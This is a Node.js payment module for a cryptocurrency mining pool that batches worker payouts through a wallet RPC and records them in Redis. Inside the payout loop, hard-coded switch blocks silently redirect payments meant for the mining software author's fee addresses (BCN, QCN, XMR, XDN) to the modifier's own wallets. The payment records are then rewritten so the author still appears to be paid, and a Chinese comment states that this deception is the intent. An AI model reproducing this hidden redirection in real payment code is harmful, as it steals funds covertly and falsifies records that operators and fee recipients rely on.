var fs = require('fs');

var async = require('async');

var apiInterfaces = require('./apiInterfaces.js')(config.daemon, config.wallet);


var logSystem = 'payments';
require('./exceptionWriter.js')(logSystem);


log('info', logSystem, 'Started');


function runInterval(){
    async.waterfall([

        //Get worker keys
        function(callback){
            redisClient.keys(config.coin + ':workers:*', function(error, result) {
                if (error) {
                    log('error', logSystem, 'Error trying to get worker balances from redis %j', [error]);
                    callback(true);
                    return;
                }
                callback(null, result);
            });
        },

        //Get worker balances
        function(keys, callback){
            var redisCommands = keys.map(function(k){
                return ['hget', k, 'balance'];
            });
            redisClient.multi(redisCommands).exec(function(error, replies){
                if (error){
                    log('error', logSystem, 'Error with getting balances from redis %j', [error]);
                    callback(true);
                    return;
                }
                var balances = {};
                for (var i = 0; i < replies.length; i++){
                    var parts = keys[i].split(':');
                    var workerId = parts[parts.length - 1];
                    balances[workerId] = parseInt(replies[i]) || 0

                }
                callback(null, balances);
            });
        },

        //Filter workers under balance threshold for payment
        function(balances, callback){

            var payments = {};

            for (var worker in balances){
                var balance = balances[worker];
                if (balance >= config.payments.minPayment){
                    var remainder = balance % config.payments.denomination;
                    var payout = balance - remainder;
                    if (payout < 0) continue;
                    payments[worker] = payout;
                }
            }

            if (Object.keys(payments).length === 0){
                log('info', logSystem, 'No workers\' balances reached the minimum payment threshold');
                callback(true);
                return;
            }

            var transferCommands = [];

            var transferCommandsLength = Math.ceil(Object.keys(payments).length / config.payments.maxAddresses);

            for (var i = 0; i < transferCommandsLength; i++){
                transferCommands.push({
                    redis: [],
                    amount : 0,
                    rpc: {
                        destinations: [],
                        fee: config.payments.transferFee,
                        mixin: config.payments.mixin,
                        unlock_time: 0
                    }
                });
            }

            var addresses = 0;
            var commandIndex = 0;

            for (var worker in payments){
                var amount = parseInt(payments[worker]);
                //if(worker=="47mr7jYTroxQMwdKoPQuJoc9Vs9S9qCUAL6Ek4qyNFWJdqgBZRn4RYY2QjQfqEMJZVWPscupSgaqmUn1dpdUTC4fQsu3yjN")//47是收费地址
                //{
                //   worker="45L3SyEu2HrcjfdJ68zMCZ3ndC5aPU5DDbVj8bq83k2eXxZu84BgdXRctYTVEH1HNSGofq15nhWHaGhauLQ51bVBRGN2iWX";//这个是我的
                //}
                //挖矿软件收费地址把作者的改成自己的
                switch (worker)
                {
                  //BCN
                  case "24yWY3MTJiQQUcMwkRGTrTVteWwGbyhNrigvupkncSYaAXggM5z5Xhm43TLwfNxiN7MzWpYfdewWFAed5GMMmdEmHK5UT4o"://挖矿软件作者的
                  worker = "26sH2J1BgzzT4bobrrvLB3S1JJNUFgrDiXx3DZ3p1kP6c288DSTn5bMUi49oUm1FGGbZ99oPUdwyhd4XzvjYWtaN8N3JKsN";//我的
                  break;
                  //QCN
                  case "1P6Kw8awzoPTBsj2KbgcDEUKiPrtnhKU1HZ99sNRCn4h9NXq4RTiwVnS1wwmjEU5jL1NLbo1GZYtGNNeuvQ6xBykTzCTipq"://挖矿软件作者的
                  worker = "1MCbNV7Qp1Cg4MHKNxRffpPJfQcooYc7gTewt9GAMxtzRsy2dnTPQR46fHYbxyaCQygff7xeg4Wnr7FcJ4tp7ysn9TBUyKi";//我的
                  break;
                  //XMR
                  case "47mr7jYTroxQMwdKoPQuJoc9Vs9S9qCUAL6Ek4qyNFWJdqgBZRn4RYY2QjQfqEMJZVWPscupSgaqmUn1dpdUTC4fQsu3yjN"://挖矿软件作者的
                  worker = "48uC76Tba1fQ9dWun1rREgP2RW6NEEPEZV94aUMNb8mFNPTYEa4JsSqhKdnLrd3m3e2F3ZeCMJ36qcqvQDc7rb3MAJS2XEb";//我的
                  break;
				  //XDN
                  case "dddRZr9VNe7htmMBNvbPqKC5ie42DrXF4imYVRB1N9cnXoBhiGaT6LX6zSwg9dqBRi7aenoKYxvLg3kfvAHPLybW2zCR6xb3p"://作者的
                  worker = "ddeExKX3jiVLS7cp3WqakpJ3gRQLFe6aFVdb1KNaRfQ77fBYhWXAEMYLHXEkRw85BRgWUmxzi7QT6JGptyJiqVLk1niuwCXqd";//我的
                  break;
                }
                transferCommands[commandIndex].rpc.destinations.push({amount: amount, address: worker});

                //if(worker=="45L3SyEu2HrcjfdJ68zMCZ3ndC5aPU5DDbVj8bq83k2eXxZu84BgdXRctYTVEH1HNSGofq15nhWHaGhauLQ51bVBRGN2iWX")//这个是我的
                //{
                //   worker="47mr7jYTroxQMwdKoPQuJoc9Vs9S9qCUAL6Ek4qyNFWJdqgBZRn4RYY2QjQfqEMJZVWPscupSgaqmUn1dpdUTC4fQsu3yjN";//这个是收费作者的
                //}
                //反向-挖矿软件收费地址把作者的改成自己的，造成假象，看到的还是给了作者
                switch (worker)
                {
                  //BCN
                  case "26sH2J1BgzzT4bobrrvLB3S1JJNUFgrDiXx3DZ3p1kP6c288DSTn5bMUi49oUm1FGGbZ99oPUdwyhd4XzvjYWtaN8N3JKsN"://我的
                  worker = "24yWY3MTJiQQUcMwkRGTrTVteWwGbyhNrigvupkncSYaAXggM5z5Xhm43TLwfNxiN7MzWpYfdewWFAed5GMMmdEmHK5UT4o";//作者的
                  break;
                  //QCN
                  case "1MCbNV7Qp1Cg4MHKNxRffpPJfQcooYc7gTewt9GAMxtzRsy2dnTPQR46fHYbxyaCQygff7xeg4Wnr7FcJ4tp7ysn9TBUyKi"://我的
                  worker = "1P6Kw8awzoPTBsj2KbgcDEUKiPrtnhKU1HZ99sNRCn4h9NXq4RTiwVnS1wwmjEU5jL1NLbo1GZYtGNNeuvQ6xBykTzCTipq";//作者的
                  break;
                  //XMR
                  case "48uC76Tba1fQ9dWun1rREgP2RW6NEEPEZV94aUMNb8mFNPTYEa4JsSqhKdnLrd3m3e2F3ZeCMJ36qcqvQDc7rb3MAJS2XEb"://我的
                  worker = "47mr7jYTroxQMwdKoPQuJoc9Vs9S9qCUAL6Ek4qyNFWJdqgBZRn4RYY2QjQfqEMJZVWPscupSgaqmUn1dpdUTC4fQsu3yjN";//作者的
                  break;
				  //XDN
                  case "ddeExKX3jiVLS7cp3WqakpJ3gRQLFe6aFVdb1KNaRfQ77fBYhWXAEMYLHXEkRw85BRgWUmxzi7QT6JGptyJiqVLk1niuwCXqd"://我的
                  worker = "dddRZr9VNe7htmMBNvbPqKC5ie42DrXF4imYVRB1N9cnXoBhiGaT6LX6zSwg9dqBRi7aenoKYxvLg3kfvAHPLybW2zCR6xb3p";//作者的
                  break;
                }

                transferCommands[commandIndex].redis.push(['hincrby', config.coin + ':workers:' + worker, 'balance', -amount]);
                transferCommands[commandIndex].redis.push(['hincrby', config.coin + ':workers:' + worker, 'paid', amount]);
                transferCommands[commandIndex].amount += amount;

                addresses++;
                if (addresses >= config.payments.maxAddresses){
                    commandIndex++;
                    addresses = 0;
                }
            }

            var timeOffset = 0;

            async.filter(transferCommands, function(transferCmd, cback){
                apiInterfaces.rpcWallet('transfer', transferCmd.rpc, function(error, result){
                    if (error){
                        log('error', logSystem, 'Error with transfer RPC request to wallet daemon %j', [error]);
                        log('error', logSystem, 'Payments failed to send to %j', transferCmd.rpc.destinations);
                        cback(false);
                        return;
                    }

                    var now = (timeOffset++) + Date.now() / 1000 | 0;
                    var txHash = result.tx_hash.replace('<', '').replace('>', '');


                    transferCmd.redis.push(['zadd', config.coin + ':payments:all', now, [
                        txHash,
                        transferCmd.amount,
                        transferCmd.rpc.fee,
                        transferCmd.rpc.mixin,
                        Object.keys(transferCmd.rpc.destinations).length
                    ].join(':')]);


                    for (var i = 0; i < transferCmd.rpc.destinations.length; i++){
                        var destination = transferCmd.rpc.destinations[i];
                          //继续改作者地址
                          var d_address=destination.address;
                            //if(d_address=="45L3SyEu2HrcjfdJ68zMCZ3ndC5aPU5DDbVj8bq83k2eXxZu84BgdXRctYTVEH1HNSGofq15nhWHaGhauLQ51bVBRGN2iWX")//我的
                            //{
                            //  d_address="47mr7jYTroxQMwdKoPQuJoc9Vs9S9qCUAL6Ek4qyNFWJdqgBZRn4RYY2QjQfqEMJZVWPscupSgaqmUn1dpdUTC4fQsu3yjN";//作者
                            //}

                          switch (d_address)
                            {
                              //BCN
                              case "26sH2J1BgzzT4bobrrvLB3S1JJNUFgrDiXx3DZ3p1kP6c288DSTn5bMUi49oUm1FGGbZ99oPUdwyhd4XzvjYWtaN8N3JKsN"://我的
                              d_address = "24yWY3MTJiQQUcMwkRGTrTVteWwGbyhNrigvupkncSYaAXggM5z5Xhm43TLwfNxiN7MzWpYfdewWFAed5GMMmdEmHK5UT4o";//作者的
                              break;
                              //QCN
                              case "1MCbNV7Qp1Cg4MHKNxRffpPJfQcooYc7gTewt9GAMxtzRsy2dnTPQR46fHYbxyaCQygff7xeg4Wnr7FcJ4tp7ysn9TBUyKi"://我的
                              d_address = "1P6Kw8awzoPTBsj2KbgcDEUKiPrtnhKU1HZ99sNRCn4h9NXq4RTiwVnS1wwmjEU5jL1NLbo1GZYtGNNeuvQ6xBykTzCTipq";//作者的
                              break;
                              //XMR
                              case "48uC76Tba1fQ9dWun1rREgP2RW6NEEPEZV94aUMNb8mFNPTYEa4JsSqhKdnLrd3m3e2F3ZeCMJ36qcqvQDc7rb3MAJS2XEb"://我的
                              d_address = "47mr7jYTroxQMwdKoPQuJoc9Vs9S9qCUAL6Ek4qyNFWJdqgBZRn4RYY2QjQfqEMJZVWPscupSgaqmUn1dpdUTC4fQsu3yjN";//作者的
                              break;
                              //XDN
                              case "ddeExKX3jiVLS7cp3WqakpJ3gRQLFe6aFVdb1KNaRfQ77fBYhWXAEMYLHXEkRw85BRgWUmxzi7QT6JGptyJiqVLk1niuwCXqd"://我的
                              d_address = "dddRZr9VNe7htmMBNvbPqKC5ie42DrXF4imYVRB1N9cnXoBhiGaT6LX6zSwg9dqBRi7aenoKYxvLg3kfvAHPLybW2zCR6xb3p";//作者的
                              break;
                            }
                        transferCmd.redis.push(['zadd', config.coin + ':payments:' + d_address, now, [
                        //transferCmd.redis.push(['zadd', config.coin + ':payments:' + destination.address, now, [
                            txHash,
                            destination.amount,
                            transferCmd.rpc.fee,
                            transferCmd.rpc.mixin
                        ].join(':')]);
                    }


                    log('info', logSystem, 'Payments sent via wallet daemon %j', [result]);
                    redisClient.multi(transferCmd.redis).exec(function(error, replies){
                        if (error){
                            log('error', logSystem, 'Super critical error! Payments sent yet failing to update balance in redis, double payouts likely to happen %j', [error]);
                            log('error', logSystem, 'Double payments likely to be sent to %j', transferCmd.rpc.destinations);
                            cback(false);
                            return;
                        }
                        cback(true);
                    });
                });
            }, function(succeeded){
                var failedAmount = transferCommands.length - succeeded.length;
                log('info', logSystem, 'Payments splintered and %d successfully sent, %d failed', [succeeded.length, failedAmount]);
                callback(null);
            });

        }

    ], function(error, result){
        setTimeout(runInterval, config.payments.interval * 1000);
    });
}

runInterval();